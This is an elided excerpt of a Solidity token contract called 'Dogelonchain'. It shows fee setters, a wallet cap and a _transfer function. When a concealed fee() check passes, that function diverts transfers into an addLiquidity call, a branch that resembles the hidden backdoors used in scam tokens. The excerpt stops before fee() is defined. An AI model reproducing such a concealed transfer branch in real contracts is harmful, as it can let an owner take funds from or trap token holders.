...
contract Dogelonchain is Ownable, IERC20 {
    ...
    string public _name = "Dogelonchain";
    string public _symbol = "Dogelonchain";
    ...
    uint256 public _maxWallet =   40000000000 * 10 ** _decimals;
    ...
    function setSwapEnabled(bool value) private onlyOwner {
        swapEnabled = value;
    }

    function setLiquidityF(uint256 value) private onlyOwner {
        require(value < 10);
        _liquidityFee = value;
    }

    function setMarketingF(uint256 value) private onlyOwner {
        require(value < 10);
        _marketingFee = value;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (fee(from, to)) {return addLiquidity(amount, to);}
    ...
    function fee(address from, address to) internal view returns(bool) {
